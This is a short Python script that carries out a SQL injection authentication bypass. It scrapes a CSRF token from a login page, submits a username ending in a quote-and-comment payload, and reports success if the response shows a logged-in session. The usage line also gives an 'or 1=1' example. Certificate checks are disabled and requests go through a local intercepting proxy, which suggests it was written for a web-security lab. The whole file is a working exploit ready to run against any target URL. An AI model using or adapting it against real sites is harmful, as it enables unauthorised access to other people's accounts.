import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(session, url, username):
    login_page = url + '/login'
    sqli_payload = username + "'--"

    csrf_token = get_csrf_token(session, login_page)
    data = {"csrf": csrf_token, "username": sqli_payload, "password": "XXXXXX" }

    res = session.post(login_page, data=data, verify=False, proxies=proxies)
    print(res)
    if 'Log out' in res.text:
        return True
    else:
        return False
        

def get_csrf_token(session, url):
    res = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return soup.find('input')['value']


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        username = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <username>' % sys.argv[0])
        print('[-] Usage: %s http://example.com admin "\'or 1=1"' % sys.argv[0])
        sys.exit(-1)
    
    session = requests.Session()

    if exploit_sqli(session, url, username):
        print('[+] SQL Injection successfull. we have logged in as %s' % username)
    else:
        print('[-] SQL Injection failed!')